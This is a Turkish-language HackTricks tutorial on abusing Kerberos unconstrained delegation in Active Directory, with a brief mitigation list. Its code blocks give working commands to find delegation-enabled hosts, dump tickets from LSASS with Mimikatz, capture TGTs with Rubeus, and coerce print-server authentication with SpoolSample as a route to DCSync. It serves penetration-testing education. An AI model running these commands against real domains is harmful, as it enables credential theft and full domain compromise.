# Unconstrained Delegation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Unconstrained delegation

Bu, bir Alan Yöneticisinin alan içindeki herhangi bir **Bilgisayara** ayarlayabileceği bir özelliktir. Daha sonra, bir **kullanıcı Bilgisayara giriş yaptığında**, o kullanıcının **TGT'sinin bir kopyası** **DC tarafından sağlanan TGS'ye** **gönderilecek ve LSASS'te bellekte saklanacaktır**. Yani, makinede Yönetici ayrıcalıklarınız varsa, **biletleri dökebilir ve kullanıcıları taklit edebilirsiniz**.

Eğer bir alan yöneticisi "Sınırsız Delegasyon" özelliği etkin olan bir Bilgisayara giriş yaparsa ve o makinede yerel yönetici ayrıcalıklarınız varsa, bileti dökebilir ve Alan Yöneticisini her yerde taklit edebilirsiniz (alan privesc).

Bu **özelliğe sahip Bilgisayar nesnelerini bulabilirsiniz**; [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) niteliğinin [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) içerip içermediğini kontrol ederek. Bunu ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ LDAP filtresi ile yapabilirsiniz; bu, powerview'ün yaptığıdır:

<pre class="language-bash"><code class="lang-bash"># Sınırsız bilgisayarları listele
## Powerview
Get-NetComputer -Unconstrained #DC'ler her zaman görünür ama privesc için faydalı değildir
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Mimikatz ile biletleri dışa aktar
</strong>privilege::debug
sekurlsa::tickets /export #Tavsiye edilen yol
kerberos::list /export #Başka bir yol

# Girişleri izleyin ve yeni biletleri dışa aktarın
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Yeni TGT'ler için her 10 saniyede bir kontrol et</code></pre>

Yönetici (veya kurban kullanıcının) biletini bellekte **Mimikatz** veya **Rubeus ile yükleyin** [**Bileti Geç**](pass-the-ticket.md)**.**\
Daha fazla bilgi: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Sınırsız delegasyon hakkında daha fazla bilgi ired.team'de.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Zorla Kimlik Doğrulama**

Eğer bir saldırgan **"Sınırsız Delegasyona" izin verilen bir bilgisayarı ele geçirebilirse**, bir **Yazıcı sunucusunu** **otomatik olarak giriş yapmaya** **kandırabilir** ve bu da sunucunun belleğinde bir TGT **kaydedebilir**.\
Daha sonra, saldırgan **Bileti Geç saldırısı yaparak** yazıcı sunucu bilgisayar hesabını taklit edebilir.

Bir yazıcı sunucusunu herhangi bir makineye giriş yapması için [**SpoolSample**](https://github.com/leechristensen/SpoolSample) kullanabilirsiniz:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Eğer TGT bir etki alanı denetleyicisinden (DC) geliyorsa, bir [**DCSync attack**](acl-persistence-abuse/#dcsync) gerçekleştirebilir ve DC'den tüm hash'leri elde edebilirsiniz.\
[**Bu saldırı hakkında daha fazla bilgi ired.team'de.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Kimlik doğrulamayı zorlamak için diğer yollar:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Mitigasyon

* DA/Yönetici girişlerini belirli hizmetlerle sınırlayın
* Ayrıcalıklı hesaplar için "Hesap hassas ve devredilemez" ayarını yapın.

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.**

</details>
{% endhint %}
